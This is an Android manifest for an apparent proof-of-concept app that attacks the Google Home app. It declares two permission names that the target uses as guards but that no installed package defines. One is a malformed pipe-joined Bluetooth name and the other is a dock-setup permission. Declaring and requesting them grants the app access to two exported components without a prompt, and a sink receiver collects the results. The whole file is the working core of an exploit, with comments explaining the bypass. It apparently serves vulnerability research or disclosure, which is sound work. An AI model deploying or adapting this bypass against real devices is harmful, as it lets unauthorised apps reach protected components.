<?xml version="1.0" encoding="utf-8"?>
<!--
  Proof of concept for two exported components in Google Home
  (com.google.android.apps.chromecast.app) that are guarded by permission
  names no installed package defines.

  This app requests no real Android permission of any kind. The only two
  <uses-permission> entries below are names it also declares itself, so the
  system grants them at install with no prompt. Anything this app can do,
  any app can do.
-->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.cindrasec.mvrpprobe">

    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34" />

    <!--
      Guard on LockProximityReceiver. The app's manifest sets
          android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
      but that attribute takes exactly one permission name, so the whole
      string including the pipe is read as a single name. No permission by
      that name exists on any device, which is why declaring it here works.
    -->
    <permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
                android:protectionLevel="normal" />
    <uses-permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN" />

    <!--
      Guard on FirstDockActivity. No package installed on the test device
      defines this one.
    -->
    <permission android:name="com.google.android.settings.setup.dock.RUN_DOCK_SETUP"
                android:protectionLevel="normal" />
    <uses-permission android:name="com.google.android.settings.setup.dock.RUN_DOCK_SETUP" />

    <application
        android:label="poc"
        android:allowBackup="false"
        android:hasCode="true">
        <activity
            android:name="com.cindrasec.mvrpprobe.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!--
          Where anything sent to this app's IntentSender arrives. Not
          exported: it is reachable only through the PendingIntent this app
          creates, which carries this app's own identity.
        -->
        <receiver
            android:name="com.cindrasec.mvrpprobe.SinkReceiver"
            android:exported="false" />
    </application>
</manifest>
